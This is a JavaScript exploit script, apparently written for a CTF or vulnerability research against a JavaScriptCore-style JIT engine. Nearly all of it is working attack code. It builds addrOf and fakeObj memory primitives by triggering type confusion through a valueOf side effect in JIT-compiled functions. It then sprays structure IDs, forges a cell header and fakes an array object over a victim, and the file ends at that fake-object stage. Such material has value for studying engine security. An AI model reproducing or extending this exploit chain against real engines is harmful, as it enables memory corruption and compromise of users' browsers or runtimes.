/*************************************************************
 * File Name: exp.js
 * 
 * Created on: 2021-05-06 06:12:59
 * Author: raycp
 * 
 * Last Modified: 2021-05-11 10:57:21
 * Description: 
************************************************************/
const MAX_ITERATIONS = 0xc0000;//4800;

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    // let tmp = Array.from(u32);
    return u32[1] * 0x100000000 + u32[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

// 64-bit unsigned integer to jsValue
function i2obj(val)
{
    return i2f(val-0x01000000000000);
}

// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

function MakeJitCompiledFunction() {
    // Some code to avoid inlining...
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }

    return target;
}

function AddrOfFoo(arr, c)
{
    arr[0];
    Math.clz32(c);
    return arr[0];
}
let gDoubleArr = [1.1, 2.2, 3.3];
let transitionArr = [1.1, 2.2, 3.3];
transitionArr.x = 1;

for (let i=0; i<0x30000; i++) {
        AddrOfFoo(gDoubleArr, '1');  
}

function AddrOf(obj) 
{
    let doubleArr = new Array(1.1, 2.2, 3.3);  // need `new Array` to make double array, `doubleArr = [1.1, 2.2, 3.3]`` will be object array when multiple call`
    let evilObj = {valueOf: function() { doubleArr[0] =obj; return '2' }}; 

    let addr = AddrOfFoo(doubleArr, evilObj);

    return f2i(addr);
}

function FakeObjFoo(arr, c, val)
{
    arr[0];
    Math.clz32(c);
    arr[0] = val;
}

for (let i=0; i<0x30000; i++) {
        FakeObjFoo(gDoubleArr, '1', 1.1);  
}

function FakeObj(addr)
{
    addr = i2f(addr);
    let doubleArr = new Array(1.1, 2.2, 3.3);  // need `new Array` to make double array, `doubleArr = [1.1, 2.2, 3.3]`` will be object array when multiple call`
    let evilObj = {valueOf: function() { doubleArr[0] ={}; return '2' }}; 

    FakeObjFoo(doubleArr, evilObj, addr);

    return doubleArr[0];

}
/* test addrOf primitive and fakeObj primitive
let obj = [1.1, {}];
print(describe(obj));
let addr = addrOf(obj);
print(hex(addr));
let f = fakeObj(addr);
print(describe(f));
let obj1 = [1.1, '2'];
print(describe(obj1));
addr = addrOf(obj1);
print(hex(addr));
f = fakeObj(addr);
print(describe(f));
*/

var structureSpray = [];
var noCoW = 13.37;

// spray the structure id
for(let i=0; i<0x2000; i++) {
    let arr = [noCoW, 2.2];
    arr['prop'] = 13.37;
    arr['prop_'+i] = 13.37;
    structureSpray.push(arr);
}

var victim = structureSpray[Math.floor(Math.random() * structureSpray.length)];

// ArrayWithDouble cell
var doubleCellHeader = 0x0108230700000300;
// 0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
// 0x7,                                   // m_indexingTypeAndMisc (ArrayWithDouble)
// 0x20,                                  // m_type (ArrayType)
// 0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
// 0x1                                    // m_cellState (DefinitelyWhite)

// ArrayWithContiguous cell
var contiguousCellHeader = 0x0108230700000300;
// 0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
// 0x9,                                   // m_indexingTypeAndMisc (ArrayWithContiguous)
// 0x20,                                  // m_type (ArrayType)
// 0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
// 0x1                                    // m_cellState (DefinitelyWhite)

// container to store fake driver object
var container = {
    cellHeader: i2obj(contiguousCellHeader),
    butterfly: victim   
};

var containerAddr = AddrOf(container);
var fakeArrAddr = containerAddr + 0x10;
print("[+] fake driver object addr: "+hex(fakeArrAddr));
var driver = FakeObj(fakeArrAddr);
print(describe(driver));
print(describe(victim));


